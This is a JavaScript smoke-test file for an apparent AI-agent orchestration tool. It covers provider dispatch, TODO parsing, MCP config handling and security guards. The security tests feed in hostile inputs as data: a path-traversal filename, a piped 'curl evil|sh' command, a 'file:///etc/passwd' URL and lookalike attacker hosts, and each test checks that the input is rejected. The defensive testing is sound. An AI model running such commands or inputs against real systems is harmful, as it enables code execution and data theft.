// Lightweight smoke tests (no framework) — guard the SOLID provider layer +
// core parsing against regressions. Run: node test/smoke.mjs (after npm run build).
import assert from 'node:assert';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { providerRegistry } from '../out/core/provider/ProviderRegistry.js';
import { parseTodoContent, countRemaining, parseTodo, appendTask, markInProgress, resetToTodo } from '../out/todo.js';
import { replaceProjectBuiltinMcp, saveProjectUserMcp, loadProjectAllMcp, isRemoteMcp, isSafeStdioMcpCommand, sanitizeRemoteMcpEntries } from '../out/core/projectMcp.js';
import { officeWsUrl, describePush } from '../out/commands/mcpOperate.js';
import { saveAttachment } from '../out/messageBuilder.js';
import { RateLimitDetector, AuthDetector } from '../out/rateLimit.js';
import { isTrustedDownloadUrl } from '../out/agentBackup/upload.js';

let pass = 0;
const ok = (name, fn) => { fn(); console.log('  ✓', name); pass++; };

// Registry resolves every provider id with the right kind.
const expected = {
  'claude-cli': 'cli', 'copilot-cli': 'cli', 'opencode-cli': 'cli', 'grok-cli': 'cli',
  'claude-tui': 'tui', 'grok-tui': 'tui', 'copilot-sdk': 'sdk', 'opencode-sdk': 'sdk',
};
ok('registry has all 8 providers', () => assert.equal(providerRegistry.ids().length, 8));
for (const [id, kind] of Object.entries(expected)) {
  ok(`registry resolves ${id} (kind=${kind})`, () => {
    const p = providerRegistry.get(id);
    assert.equal(p.id, id); assert.equal(p.kind, kind);
    assert.equal(typeof p.dispatch, 'function');
  });
}
ok('unknown provider throws', () => assert.throws(() => providerRegistry.get('nope')));

// CLI provider builds a non-empty shell command from a DispatchRequest.
ok('opencode-cli builds a command', async () => {
  const req = { root: '/tmp/x', agentProfileFile: '/tmp/x/p.md', messageFile: '/tmp/x/m.md',
    combinedFile: '/tmp/x/c.md', includeProfile: true, settings: { opencodeModel: 'm', hooksEnabled: false },
    stdoutFile: '/tmp/x/o.txt', exitFile: '/tmp/x/e.txt' };
  const out = await providerRegistry.get('opencode-cli').dispatch(req, { log: () => {}, launcher: { launch() {} } });
  assert.ok(out.command && out.command.includes('opencode run'), 'command should run opencode');
});

// todo parsing.
ok('parseTodoContent + countRemaining', () => {
  const tasks = parseTodoContent('# TODO\n\n- [ ] a\n- [~] b\n- [x] 2026-01-01  c\n');
  assert.equal(tasks.length, 3);
  assert.equal(countRemaining(tasks), 2); // [ ] + [~]
});

// .mcp.json preserves remote (http/sse) entries alongside stdio ones.
ok('projectMcp preserves remote (http) builtin entries', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'autodev-mcp-'));
  try {
    replaceProjectBuiltinMcp(root, {
      'pixel-office': { type: 'http', url: 'https://h/api/mcp', headers: { Authorization: 'Bearer agt_x' } },
      'memory': { command: 'npx', args: ['-y', 'server-memory'] },
    });
    const all = loadProjectAllMcp(root);
    assert.ok(isRemoteMcp(all['pixel-office']), 'pixel-office should be remote');
    assert.equal(all['pixel-office'].url, 'https://h/api/mcp');
    assert.equal(all['pixel-office'].headers.Authorization, 'Bearer agt_x');
    assert.ok(!('command' in all['pixel-office']), 'remote entry has no command');
    assert.equal(all['memory'].command, 'npx');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

// Malformed user entries (neither command nor url) are dropped, not written broken.
ok('projectMcp drops malformed user entries', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'autodev-mcp-'));
  try {
    saveProjectUserMcp(root, {
      bogus: { args: ['x'] },              // no command, no url → dropped
      good:  { command: 'node' },
      rem:   { url: 'https://h/mcp' },     // remote → kept
    });
    const all = loadProjectAllMcp(root);
    assert.ok(!('bogus' in all), 'malformed entry should be dropped');
    assert.equal(all['good'].command, 'node');
    assert.ok(isRemoteMcp(all['rem']), 'url-only entry kept as remote');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

// mcp-operate presence socket: ws-url derivation + push→notice mapping.
ok('officeWsUrl derives wss from https office-mcp url', () => {
  assert.equal(officeWsUrl('https://host.example/api/office-mcp'), 'wss://host.example/ws');
  assert.equal(officeWsUrl('http://localhost:8000/api/office-mcp'), 'ws://localhost:8000/ws');
  assert.equal(officeWsUrl('not a url'), '');
});

ok('describePush maps task/message pushes, ignores noise', () => {
  assert.equal(describePush({ type: 'new_task', data: { task: { title: 'Ship it' } } }), 'New task: Ship it');
  assert.equal(describePush({ task: { metadata: { event: 'user_message', task: { text: 'hi' } } } }), 'New message: hi');
  assert.equal(describePush({ type: 'agent_update', data: {} }), null);
  assert.equal(describePush({ type: 'task_deleted', data: { id: 'x' } }), null);
});

// resetToTodo / markInProgress must work on id-prefixed task lines (the real format).
ok('resetToTodo flips an id-prefixed [~] task back to [ ]', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'autodev-todo-'));
  try {
    const f = path.join(root, 'TODO.md');
    fs.writeFileSync(f, '## Todo\n\n');
    appendTask(f, 'do the thing', 'task-2026-07-13-abc123');
    let tasks = parseTodo(f);
    assert.equal(tasks.length, 1);
    // to in-progress
    markInProgress(f, tasks[0]);
    tasks = parseTodo(f);
    assert.equal(tasks[0].status, 'in-progress', 'markInProgress should set [~]');
    // back to todo
    resetToTodo(f, tasks[0]);
    tasks = parseTodo(f);
    assert.equal(tasks[0].status, 'todo', 'resetToTodo should restore [ ]');
    assert.equal(tasks[0].id, 'task-2026-07-13-abc123', 'id prefix preserved');
    assert.equal(tasks[0].text, 'do the thing', 'text preserved');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

// saveAttachment must never escape the attachments dir via a traversal filename.
ok('saveAttachment contains path-traversal filenames', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'autodev-att-'));
  try {
    const rel = saveAttachment(root, '../../../../evil.sh', Buffer.from('x'), 'grp');
    assert.ok(!rel.includes('..'), 'returned path should not contain ..');
    const abs = path.resolve(root, rel);
    const attachRoot = path.resolve(root, '.autodev/messages/attachments');
    assert.ok(abs.startsWith(attachRoot + path.sep), 'file must stay under attachments dir');
    assert.ok(fs.existsSync(abs), 'file written to the safe location');
    // The escaping target must NOT exist.
    assert.ok(!fs.existsSync(path.resolve(root, '../../../../evil.sh')));
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

// Rate-limit detection: real banners match, ordinary prose does not.
ok('RateLimitDetector matches banners, not prose', () => {
  assert.ok(RateLimitDetector.matches("You've hit your limit · resets 9pm (Europe/Sofia)"));
  assert.ok(RateLimitDetector.matches('API Error: 429 rate limit exceeded'));
  assert.ok(RateLimitDetector.matches('Working... · Rate limited'));
  assert.ok(!RateLimitDetector.matches('I added rate limiting to the API endpoint'));
  assert.ok(!RateLimitDetector.matches('The rate limit is 100 requests per second'));
});

// Auth-failure detection: real logged-out banners match, ordinary prose does not.
ok('AuthDetector matches auth-failure banners, not prose', () => {
  assert.ok(AuthDetector.matches('Invalid API key · Please run /login'));
  assert.ok(AuthDetector.matches('Your credit balance is too low to access the Anthropic API'));
  assert.ok(AuthDetector.matches('API Error: 401 {"type":"authentication_error"}'));
  assert.ok(AuthDetector.matches('OAuth token has expired, please sign in again'));
  assert.ok(AuthDetector.matches('You are not logged in. Run /login to authenticate.'));
  // Ordinary code / prose the agent might write must NOT pause the loop.
  assert.ok(!AuthDetector.matches('I added an auth guard that returns 401 when the user is not authenticated'));
  assert.ok(!AuthDetector.matches('The API key is stored in the environment'));
  assert.ok(!AuthDetector.matches('validate the api key against the database'));
  // detect() returns a non-null AuthError only for a real banner.
  assert.ok(AuthDetector.detect('Invalid API key · Please run /login') !== null);
  assert.ok(AuthDetector.detect('just some normal output') === null);
});

// mcp_update hardening: shell/path commands are rejected, launchers + remote allowed.
ok('isSafeStdioMcpCommand rejects shells, paths, metacharacters', () => {
  assert.ok(isSafeStdioMcpCommand('npx'));
  assert.ok(isSafeStdioMcpCommand('uvx'));
  assert.ok(isSafeStdioMcpCommand('node'));
  assert.ok(!isSafeStdioMcpCommand('bash'));
  assert.ok(!isSafeStdioMcpCommand('sh'));
  assert.ok(!isSafeStdioMcpCommand('/bin/bash'));
  assert.ok(!isSafeStdioMcpCommand('./evil.sh'));
  assert.ok(!isSafeStdioMcpCommand('curl evil|sh'));
  assert.ok(!isSafeStdioMcpCommand('env'));
  assert.ok(!isSafeStdioMcpCommand(''));
  assert.ok(!isSafeStdioMcpCommand(undefined));
});

ok('sanitizeRemoteMcpEntries drops unsafe stdio + non-http remotes', () => {
  const { safe, rejected } = sanitizeRemoteMcpEntries({
    good:   { command: 'npx', args: ['-y', 'server-memory'] },
    evil:   { command: 'bash', args: ['-c', 'curl evil|sh'] },
    remote: { type: 'http', url: 'https://h/api/mcp' },
    badurl: { url: 'file:///etc/passwd' },
  });
  assert.ok('good' in safe && 'remote' in safe);
  assert.ok(!('evil' in safe) && !('badurl' in safe));
  assert.ok(rejected.includes('evil') && rejected.includes('badurl'));
});

// restore_request SSRF guard: only the configured server origin is trusted.
ok('isTrustedDownloadUrl pins the download to the server origin', () => {
  const server = 'wss://office.example/ws?token=agt_x&endpoint=slug';
  assert.ok(isTrustedDownloadUrl('https://office.example/api/agents/1/exports/2/download', server));
  assert.ok(!isTrustedDownloadUrl('https://attacker.example/x', server));
  assert.ok(!isTrustedDownloadUrl('http://office.example/x', server));   // scheme downgrade
  assert.ok(!isTrustedDownloadUrl('https://office.example.evil.com/x', server));
  assert.ok(!isTrustedDownloadUrl('not a url', server));
  // Plain-ws dev server matches plain-http download.
  assert.ok(isTrustedDownloadUrl('http://localhost:8000/api/x', 'ws://localhost:8000/ws'));
});

Promise.resolve().then(() => console.log(`\n${pass} checks passed`));
